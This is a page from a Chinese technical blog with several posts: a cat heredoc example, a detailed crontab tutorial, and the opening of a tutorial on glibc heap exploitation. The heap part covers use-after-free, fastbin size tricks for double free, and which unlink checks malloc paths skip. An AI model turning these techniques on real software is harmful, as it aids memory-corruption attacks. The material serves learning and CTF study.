<p>解决办法二，虽然这个办法看起来靠谱，但是这里忽略了对_sysconfigdata.py中build_time_vars字典的理解与修改过程。这个任务也挺复杂的，所以我没来得及做。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/04/cat命令输出多行至文件/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/12/04/cat命令输出多行至文件/" itemprop="url">cat命令输出多行至文件</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-04T02:07:50+08:00">
                2017-12-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/code/" itemprop="url" rel="index">
                    <span itemprop="name">code</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="一、cat和EOF"><a href="#一、cat和EOF" class="headerlink" title="一、cat和EOF"></a><strong>一、cat和EOF</strong></h4><p>cat命令是linux下的一个文本输出命令，通常是用于观看某个文件的内容的；<br>EOF是“end of file”，表示文本结束符。<br>结合这两个标识，即可避免使用多行echo命令的方式，并实现多行输出的结果。</p>
<h4 id="二、使用"><a href="#二、使用" class="headerlink" title="二、使用"></a><strong>二、使用</strong></h4><p>看例子是最快的熟悉方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># cat &lt;&lt; EOF &gt; test.sh</div><div class="line">&gt; #!/bin/bash</div><div class="line">&gt; #you Shell script writes here.</div><div class="line">&gt; EOF</div></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/26/crontab指令介绍/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/11/26/crontab指令介绍/" itemprop="url">crontab指令介绍</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-26T11:58:03+08:00">
                2017-11-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/tool/" itemprop="url" rel="index">
                    <span itemprop="name">tool</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>at 命令是针对仅运行一次的任务，循环运行的例行性计划任务，linux系统则是由 cron (crond) 这个系统服务来控制的。Linux 系统上面原本就有非常多的计划性工作，因此这个系统服务是默认启动的。另外, 由于使用者自己也可以设置计划任务，所以， Linux 系统也提供了使用者控制计划任务的命令 :crontab 命令。</p>
<h3 id="一、crond简介"><a href="#一、crond简介" class="headerlink" title="一、crond简介"></a>一、crond简介</h3><p>crond是linux下用来周期性的执行某种任务或等待处理某些事件的一个守护进程，与windows下的计划任务类似，当安装完成操作系统后，默认会安装此服务工具，并且会自动启动crond进程，crond进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。</p>
<p>Linux下的任务调度分为两类，系统任务调度和用户任务调度。</p>
<p>系统任务调度：系统周期性所要执行的工作，比如写缓存数据到硬盘、日志清理等。在/etc目录下有一个crontab文件，这个就是系统任务调度的配置文件。</p>
<p>/etc/crontab文件包括下面几行：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[root@localhost ~]# cat /etc/crontab </div><div class="line">SHELL=/bin/bash</div><div class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</div><div class="line">MAILTO=""</div><div class="line">HOME=/</div><div class="line"><span class="meta">#</span> run-parts</div><div class="line">51 * * * * root run-parts /etc/cron.hourly</div><div class="line">24 7 * * * root run-parts /etc/cron.daily</div><div class="line">22 4 * * 0 root run-parts /etc/cron.weekly</div><div class="line">42 4 1 * * root run-parts /etc/cron.monthly</div></pre></td></tr></table></figure>
<p>前四行是用来配置crond任务运行的环境变量，第一行SHELL变量指定了系统要使用哪个shell，这里是bash，第二行PATH变量指定了系统执行命令的路径，第三行MAILTO变量指定了crond的任务执行信息将通过电子邮件发送给root用户，如果MAILTO变量的值为空，则表示不发送任务执行信息给用户，第四行的HOME变量指定了在执行命令或者脚本时使用的主目录。第六至九行表示的含义将在下个小节详细讲述。这里不在多说。</p>
<p>用户任务调度：用户定期要执行的工作，比如用户数据备份、定时邮件提醒等。用户可以使用 crontab 工具来定制自己的计划任务。所有用户定义的crontab 文件都被保存在 /var/spool/cron目录中。其文件名与用户名一致。</p>
<p>使用者权限文件：</p>
<p>文件：<code>/etc/cron.deny</code></p>
<p>说明：该文件中所列用户不允许使用crontab命令</p>
<p>文件：<code>/etc/cron.allow</code></p>
<p>说明：该文件中所列用户允许使用crontab命令</p>
<p>文件：<code>/var/spool/cron/</code></p>
<p>说明：所有用户crontab文件存放的目录,以用户名命名</p>
<p>crontab文件的含义：</p>
<p>用户所建立的crontab文件中，每一行都代表一项任务，每行的每个字段代表一项设置，它的格式共分为六个字段，前五段是时间设定段，第六段是要执行的命令段，格式如下：</p>
<blockquote>
<p> minute   hour   day   month   week   command</p>
</blockquote>
<p>其中：</p>
<p>minute： 表示分钟，可以是从0到59之间的任何整数。</p>
<p>hour：表示小时，可以是从0到23之间的任何整数。</p>
<p>day：表示日期，可以是从1到31之间的任何整数。</p>
<p>month：表示月份，可以是从1到12之间的任何整数。</p>
<p>week：表示星期几，可以是从0到7之间的任何整数，这里的0或7代表星期日。</p>
<p>command：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。</p>
<p>​    <img src="/images/2017-11-26/08090352-4e0aa3fe4f404b3491df384758229be1.png" alt="img"> </p>
<p>在以上各个字段中，还可以使用以下特殊字符：</p>
<p>星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。</p>
<p>逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9”</p>
<p>中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6”</p>
<p>正斜线（/）：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次。同时正斜线可以和星号一起使用，例如*/10，如果用在minute字段，表示每十分钟执行一次。</p>
<h3 id="二、crond服务"><a href="#二、crond服务" class="headerlink" title="二、crond服务"></a>二、crond服务</h3><p>安装crontab:</p>
<blockquote>
<p>yum install crontabs</p>
</blockquote>
<p>服务操作说明：</p>
<blockquote>
<p>/sbin/service crond start //启动服务<br>/sbin/service crond stop //关闭服务<br>/sbin/service crond restart //重启服务<br>/sbin/service crond reload //重新载入配置</p>
</blockquote>
<p>查看crontab服务状态：</p>
<blockquote>
<p> service crond status</p>
</blockquote>
<p>手动启动crontab服务：</p>
<blockquote>
<p> service crond start</p>
</blockquote>
<p>查看crontab服务是否已设置为开机启动，执行命令：</p>
<blockquote>
<p> ntsysv</p>
</blockquote>
<p>加入开机自动启动：</p>
<blockquote>
<p> chkconfig –level 35 crond on</p>
</blockquote>
<h3 id="三、crontab命令详解"><a href="#三、crontab命令详解" class="headerlink" title="三、crontab命令详解"></a>三、crontab命令详解</h3><h4 id="1．命令格式："><a href="#1．命令格式：" class="headerlink" title="1．命令格式："></a>1．命令格式：</h4><blockquote>
<p> crontab [-u user] file</p>
<p>crontab [-u user][ -e | -l | -r ]</p>
</blockquote>
<h4 id="2．命令功能："><a href="#2．命令功能：" class="headerlink" title="2．命令功能："></a>2．命令功能：</h4><p>通过crontab 命令，我们可以在固定的间隔时间执行指定的系统指令或 shell script脚本。时间间隔的单位可以是分钟、小时、日、月、周及以上的任意组合。这个命令非常设合周期性的日志分析或数据备份等工作。</p>
<h4 id="3．命令参数："><a href="#3．命令参数：" class="headerlink" title="3．命令参数："></a>3．命令参数：</h4><p>-u user：用来设定某个用户的crontab服务，例如，“-u ixdba”表示设定ixdba用户的crontab服务，此参数一般有root用户来运行。</p>
<p>file：file是命令文件的名字,表示将file做为crontab的任务列表文件并载入crontab。如果在命令行中没有指定这个文件，crontab命令将接受标准输入（键盘）上键入的命令，并将它们载入crontab。</p>
<p>-e：编辑某个用户的crontab文件内容。如果不指定用户，则表示编辑当前用户的crontab文件。</p>
<p>-l：显示某个用户的crontab文件内容，如果不指定用户，则表示显示当前用户的crontab文件内容。</p>
<p>-r：从/var/spool/cron目录中删除某个用户的crontab文件，如果不指定用户，则默认删除当前用户的crontab文件。</p>
<p>-i：在删除用户的crontab文件时给确认提示。</p>
<h4 id="4．常用方法："><a href="#4．常用方法：" class="headerlink" title="4．常用方法："></a>4．常用方法：</h4><h5 id="1-创建一个新的crontab文件"><a href="#1-创建一个新的crontab文件" class="headerlink" title="1). 创建一个新的crontab文件"></a>1). 创建一个新的crontab文件</h5><p>在考虑向cron进程提交一个crontab文件之前，首先要做的一件事情就是设置环境变量EDITOR。cron进程根据它来确定使用哪个编辑器编辑crontab文件。9 9 %的UNIX和LINUX用户都使用vi，如果你也是这样，那么你就编辑$ HOME目录下的<code>.profile</code>文件，在其中加入这样一行：</p>
<blockquote>
<p>EDITOR=vi; export EDITOR</p>
</blockquote>
<p>然后保存并退出。不妨创建一个名为<user> cron的文件，其中<user>是用户名，例如， davecron。在该文件中加入如下的内容。</user></user></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># (put your own initials here)echo the date to the console every</div><div class="line"># 15minutes between 6pm and 6am</div><div class="line">0,15,30,45 18-06 * * * /bin/echo &apos;date&apos; &gt; /dev/console</div></pre></td></tr></table></figure>
<p>保存并退出。确信前面5个域用空格分隔。</p>
<p>在上面的例子中，系统将每隔1 5分钟向控制台输出一次当前时间。如果系统崩溃或挂起，从最后所显示的时间就可以一眼看出系统是什么时间停止工作的。在有些系统中，用tty1来表示控制台，可以根据实际情况对上面的例子进行相应的修改。为了提交你刚刚创建的crontab文件，可以把这个新创建的文件作为cron命令的参数：</p>
<blockquote>
<p> $ crontab davecron</p>
</blockquote>
<p>现在该文件已经提交给cron进程，它将每隔1 5分钟运行一次。</p>
<p>同时，新创建文件的一个副本已经被放在/var/spool/cron目录中，文件名就是用户名(即dave)。</p>
<h5 id="2-列出crontab文件"><a href="#2-列出crontab文件" class="headerlink" title="2). 列出crontab文件"></a>2). 列出crontab文件</h5><p>   为了列出crontab文件，可以用：</p>
<blockquote>
<p>$ crontab -l</p>
<p>0,15,30,45,18-06 <em> </em> * /bin/echo <code>date</code> &gt; dev/tty1</p>
</blockquote>
<p>你将会看到和上面类似的内容。可以使用这种方法在$ H O M E目录中对crontab文件做一备份：</p>
<blockquote>
<p>\$ crontab -l &gt; $HOME/mycron</p>
</blockquote>
<p>​    这样，一旦不小心误删了crontab文件，可以用上一节所讲述的方法迅速恢复。</p>
<h5 id="3-编辑crontab文件"><a href="#3-编辑crontab文件" class="headerlink" title="3). 编辑crontab文件"></a>3). 编辑crontab文件</h5><p>   如果希望添加、删除或编辑crontab文件中的条目，而editor环境变量又设置为vi，那么就可以用vi来编辑crontab文件，相应的命令为：</p>
<blockquote>
<p>$ crontab -e</p>
</blockquote>
<p>可以像使用vi编辑其他任何文件那样修改crontab文件并退出。如果修改了某些条目或添加了新的条目，那么在保存该文件时， c r o n会对其进行必要的完整性检查。如果其中的某个域出现了超出允许范围的值，它会提示你。</p>
<p>我们在编辑crontab文件时，没准会加入新的条目。例如，加入下面的一条：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># DT:delete core files,at 3.30am on 1,7,14,21,26,26 days of each month</div><div class="line">30 3 1,7,14,21,26 * * /bin/find -name &quot;core&apos; -exec rm &#123;&#125; \;</div></pre></td></tr></table></figure>
<p>现在保存并退出。最好在crontab文件的每一个条目之上加入一条注释，这样就可以知道它的功能、运行时间，更为重要的是，知道这是哪位用户的作业。</p>
<p>现在让我们使用前面讲过的crontab -l命令列出它的全部信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ crontab -l </div><div class="line"># (crondave installed on Tue May 4 13:07:43 1999)</div><div class="line"># DT:ech the date to the console every 30 minites</div><div class="line">0,15,30,45 18-06 * * * /bin/echo date &gt; /dev/tty1</div><div class="line"># DT:delete core files,at 3.30am on 1,7,14,21,26,26 days of each month</div><div class="line">30 3 1,7,14,21,26 * * /bin/find -name &quot;core&apos; -exec rm &#123;&#125; \;</div></pre></td></tr></table></figure>
<h5 id="4-删除crontab文件"><a href="#4-删除crontab文件" class="headerlink" title="4). 删除crontab文件"></a>4). 删除crontab文件</h5><p>要删除crontab文件，可以用：</p>
<blockquote>
<p>$ crontab -r</p>
</blockquote>
<h5 id="5-恢复丢失的crontab文件"><a href="#5-恢复丢失的crontab文件" class="headerlink" title="5). 恢复丢失的crontab文件"></a>5). 恢复丢失的crontab文件</h5><p>如果不小心误删了crontab文件，假设你在自己的$ H O M E目录下还有一个备份，那么可以将其拷贝到/var/spool/cron/username，其中username是用户名。如果由于权限问题无法完成拷贝，可以用：</p>
<blockquote>
<p> $ crontab filename</p>
</blockquote>
<p>​    其中，filename是你在$HOME目录中副本的文件名。</p>
<p>我建议你在自己的$HOME目录中保存一个该文件的副本。我就有过类似的经历，有数次误删了crontab文件（因为r键紧挨在e键的右边）。这就是为什么有些系统文档建议不要直接编辑crontab文件，而是编辑该文件的一个副本，然后重新提交新的文件。</p>
<p>有些crontab的变体有些怪异，所以在使用crontab命令时要格外小心。如果遗漏了任何选项，crontab可能会打开一个空文件，或者看起来像是个空文件。这时敲delete键退出，不要按\&lt;Ctrl-D>，否则你将丢失crontab文件。</p>
<h4 id="5．使用实例"><a href="#5．使用实例" class="headerlink" title="5．使用实例"></a>5．使用实例</h4><p>实例1：每1分钟执行一次command</p>
<p>命令：<code>* * * * * command</code></p>
<p>实例2：每小时的第3和第15分钟执行</p>
<p>命令：<code>3,15 * * * * command</code></p>
<p>实例3：在上午8点到11点的第3和第15分钟执行</p>
<p>命令：<code>3,15 8-11 * * * command</code></p>
<p>实例4：每隔两天的上午8点到11点的第3和第15分钟执行</p>
<p>命令：<code>3,15 8-11 */2 * * command</code></p>
<p>实例11：每一小时重启smb </p>
<p>命令：<code>* */1 * * * /etc/init.d/smb restart</code></p>
<p>实例12：晚上11点到早上7点之间，每隔一小时重启smb </p>
<p>命令：<code>* 23-7/1 * * * /etc/init.d/smb restart</code></p>
<p>实例15：每小时执行/etc/cron.hourly目录内的脚本</p>
<p>命令：<code>01   *   *   *   *     root run-parts /etc/cron.hourly</code></p>
<p>说明：</p>
<p>run-parts这个参数了，如果去掉这个参数的话，后面就可以写要运行的某个脚本名，而不是目录名了</p>
<h3 id="四、使用注意事项"><a href="#四、使用注意事项" class="headerlink" title="四、使用注意事项"></a>四、使用注意事项</h3><ol>
<li>注意环境变量问题</li>
</ol>
<p>有时我们创建了一个crontab，但是这个任务却无法自动执行，而手动执行这个任务却没有问题，这种情况一般是由于在crontab文件中没有配置环境变量引起的。</p>
<p>在crontab文件中定义多个调度任务时，需要特别注意的一个问题就是环境变量的设置，因为我们手动执行某个任务时，是在当前shell环境下进行的，程序当然能找到环境变量，而系统自动执行任务调度时，是不会加载任何环境变量的，因此，就需要在crontab文件中指定任务运行所需的所有环境变量，这样，系统执行任务调度时就没有问题了。</p>
<p>不要假定cron知道所需要的特殊环境，它其实并不知道。所以你要保证在shelll脚本中提供所有必要的路径和环境变量，除了一些自动设置的全局变量。所以注意如下3点：</p>
<p>1）脚本中涉及文件路径时写全局路径；</p>
<p>2）脚本执行要用到java或其他环境变量时，通过source命令引入环境变量，如：</p>
<p>cat start_cbp.sh</p>
<p>#!/bin/sh</p>
<p>source /etc/profile</p>
<p>export RUN_CONF=/home/d139/conf/platform/cbp/cbp_jboss.conf</p>
<p>/usr/local/jboss-4.0.5/bin/run.sh -c mev &amp;</p>
<p>3）当手动执行脚本OK，但是crontab死活不执行时。这时必须大胆怀疑是环境变量惹的祸，并可以尝试在crontab中直接引入环境变量解决问题。如：</p>
<p>0 <em> </em> <em> </em> . /etc/profile;/bin/sh /var/www/java/audit_no_count/bin/restart_audit.sh</p>
<ol start="2">
<li>注意清理系统用户的邮件日志</li>
</ol>
<p>每条任务调度执行完毕，系统都会将任务输出信息通过电子邮件的形式发送给当前系统用户，这样日积月累，日志信息会非常大，可能会影响系统的正常运行，因此，将每条任务进行重定向处理非常重要。</p>
<p>例如，可以在crontab文件中设置如下形式，忽略日志输出：</p>
<p>0 <em>/3 </em> <em> </em> /usr/local/apache2/apachectl restart &gt;/dev/null 2&gt;&amp;1</p>
<p>“/dev/null 2&gt;&amp;1”表示先将标准输出重定向到/dev/null，然后将标准错误重定向到标准输出，由于标准输出已经重定向到了/dev/null，因此标准错误也会重定向到/dev/null，这样日志输出问题就解决了。</p>
<ol start="3">
<li>系统级任务调度与用户级任务调度</li>
</ol>
<p>系统级任务调度主要完成系统的一些维护操作，用户级任务调度主要完成用户自定义的一些任务，可以将用户级任务调度放到系统级任务调度来完成（不建议这么做），但是反过来却不行，root用户的任务调度操作可以通过“crontab –uroot –e”来设置，也可以将调度任务直接写入/etc/crontab文件，需要注意的是，如果要定义一个定时重启系统的任务，就必须将任务放到/etc/crontab文件，即使在root用户下创建一个定时重启系统的任务也是无效的。</p>
<ol start="4">
<li>其他注意事项</li>
</ol>
<p>新创建的cron job，不会马上执行，至少要过2分钟才执行。如果重启cron则马上执行。</p>
<p>当crontab突然失效时，可以尝试/etc/init.d/crond restart解决问题。或者查看日志看某个job有没有执行/报错tail -f /var/log/cron。</p>
<p>千万别乱运行crontab -r。它从Crontab目录（/var/spool/cron）中删除用户的Crontab文件。删除了该用户的所有crontab都没了。</p>
<p>在crontab中%是有特殊含义的，表示换行的意思。如果要用的话必须进行转义\%，如经常用的date ‘+%Y%m%d’在crontab里是不会执行的，应该换成date ‘+\%Y\%m\%d’。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/17/堆利用的方法/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/11/17/堆利用的方法/" itemprop="url">堆利用的方法</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-17T20:17:45+08:00">
                2017-11-17
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>在实际考虑堆利用方法时，chunk size的计算是个需要小心的地方，因为这里包括了 prev_size的复用，以及根据不同系统考虑的对齐情况，还有 chunk 的size位表示的是包括chunk header在内的size，而实际可用的size与此不同，它是减去chunk header后的大小。</p>
<p>我们还可以根据不同的条件去构造不同的chunk复用，像是只利用一个字节溢出（off-by-one）来使chunk size减小，以此来构造的poison_null_byte 漏洞等等。了解chunk复用的原理，就是去改变 size 位来使系统对错误的长度进行 malloc、free，这就是我们的目的。</p>
<p>近期做了一道题，对我的感触颇深，所以将其中用到的思想在此处进行展示：</p>
<blockquote>
<ol>
<li>堆块对堆的初始位置是没有任何限制的，也即堆块不一定要满足对其的条件。堆可以以0x6030f5开始</li>
<li>堆块大小的计算。#define chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))  其中~(SIZE_BITS)=0xfffffff8</li>
<li>fastbin大小计算。(((sz)&gt;&gt;(SIZE_SZ==8?4:3))-2)   在针对fastbin attack或者double free时，保证fastbin大致相同具有十分重要的意义。例如0x7f的fastbin与0x70大小的fastbin在同一条链上。因此很多时候就可以构造0x7f大小的fastbin，代替很难找到的0x71\0x70大小的fastbin</li>
<li>fastbin取值范围32位[16-80]，64位[32-160] 貌似总共有9个，实际上只能用前8个</li>
</ol>
</blockquote>
<h2 id="0×01-Use-After-Free"><a href="#0×01-Use-After-Free" class="headerlink" title="0×01 Use After Free"></a>0×01 Use After Free</h2><p>要学习堆中的漏洞，最基础不过的就是这个 UAF 了，UAF 漏洞原理很简单，就是在 free 掉 chunk 后，指向该 chunk 的指针还能正常使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">#include&lt;stdlib.h&gt;</div><div class="line">struct shell &#123;</div><div class="line">    void (*getshell)();</div><div class="line">&#125;;</div><div class="line">struct data &#123;</div><div class="line">    int data;</div><div class="line">&#125;;</div><div class="line">void test_getshell()&#123;</div><div class="line">    printf(&quot;I get the shell\n&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main () &#123;</div><div class="line">struct shell *p;</div><div class="line">p = (struct shell*)malloc(sizeof(struct shell));</div><div class="line"></div><div class="line">p-&gt;getshell = test_getshell;</div><div class="line">free(p);</div><div class="line">struct data *q;</div><div class="line">q = (struct data*)malloc(sizeof(struct data));</div><div class="line">q-&gt;data = 1234;</div><div class="line">p-&gt;getshell();</div><div class="line">return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>编译运行一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Legend: code, data, rodata, value</div><div class="line">Stopped reason: SIGSEGV</div><div class="line">0x00000000000004d2 in ?? ()</div></pre></td></tr></table></figure>
<p>我们可以看到 p 指向的函数地址被我们用1234给替换掉了，这就意味着我们能够利用这样一个漏洞控制 rip 寄存器，执行指令。</p>
<h2 id="0×02-unlink"><a href="#0×02-unlink" class="headerlink" title="0×02 unlink"></a>0×02 unlink</h2><p>unlink漏洞想必大家都不陌生，在前面我们提到过，系统通过 unlink 宏将 free chunk 从链表中取出，但是我在这里强调一下，并非所有从链表中取出 chunk 的操作都利用到了 unlink 宏，要知道，我们在 malloc 时，也多次将 chunk 从 bin 中取出，我想结合部分源码（只截取了取出部分的代码）来强调一下 unlink 的使用状况。</p>
<p><img src="/images/2017-11-17/420rc04q9ad0.png" alt=""></p>
<p><img src="/images/2017-11-17/420rc31ppb10.jpg" alt=""></p>
<p>在 malloc 操作中，我们多次进行了 bin 之间的转移，具体如下</p>
<p>victim指的是被取出的地址</p>
<ol>
<li><p>从 fastbin 中取出 chunk (fastbin后进先出)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mfastbinptr* fb = &amp;fastbin (av, idx);</div><div class="line">victim = *fb;</div><div class="line">*fb = victim-&gt;fd;</div></pre></td></tr></table></figure>
</li>
<li><p>从 unsortedbin 中取出 chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">victim = unsorted_chunks(av)-&gt;bk</div><div class="line">bck = victim-&gt;bk;</div><div class="line">unsorted_chunks(av)-&gt;bk = bck;</div><div class="line">bck-&gt;fd = unsorted_chunks(av);</div></pre></td></tr></table></figure>
</li>
<li><p>从 unsortedbin 向 smallbin 转移 chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if (in_smallbin_range(size)) &#123;</div><div class="line">victim_index = smallbin_index(size);</div><div class="line">bck = bin_at(av, victim_index);</div><div class="line">fwd = bck-&gt;fd;</div></pre></td></tr></table></figure>
</li>
<li><p>从 unsortedbin 向 largebin 转移 chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">mark_bin(av, victim_index);</div><div class="line">victim-&gt;bk = bck;</div><div class="line">victim-&gt;fd = fwd;</div><div class="line">fwd-&gt;bk = victim;</div><div class="line">bck-&gt;fd = victim;</div></pre></td></tr></table></figure>
</li>
<li><p>从 smallbin 中取出 chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">idx = smallbin_index(nb);</div><div class="line">bin = bin_at(av,idx);</div><div class="line">victim = last(bin);</div><div class="line">bck = victim-&gt;bk;</div><div class="line">bin-&gt;bk = bck;</div><div class="line">bck-&gt;fd = bin;</div></pre></td></tr></table></figure>
</li>
<li><p>从 largebin 中取出 chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">unlink(victim, bck, fwd);</div></pre></td></tr></table></figure>
</li>
<li><p>合并 fastbin 中 chunk 并加入到 unsortedbin 中(单向链表，bk指针需要获取)</p>
<p>(这种情况比较特殊，如果实在找不到内存分配的话，可能会调用malloc_consolidate这个函数，它就会合并fastbin到unsortedbin中)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">prevsize = p-&gt;prev_size;</div><div class="line">size += prevsize;</div><div class="line">p = chunk_at_offset(p, -((long) prevsize));</div><div class="line">unlink(p, bck, fwd);</div><div class="line">......</div><div class="line">size += nextsize;</div><div class="line">unlink(nextchunk, bck, fwd);</div></pre></td></tr></table></figure>
<p>我们发现不仅仅在 free 时进行向前向后合并时使用 unlink 宏，在 malloc 时也会有零星的 unlink 使用，而且一定要注意，上面的除了6、7外，在进行取出 chunk 操作时，并没有进行 unlink，所以在对这一部分进行漏洞利用时，不需要考虑 unlink 的检查。</p>
</li>
</ol>
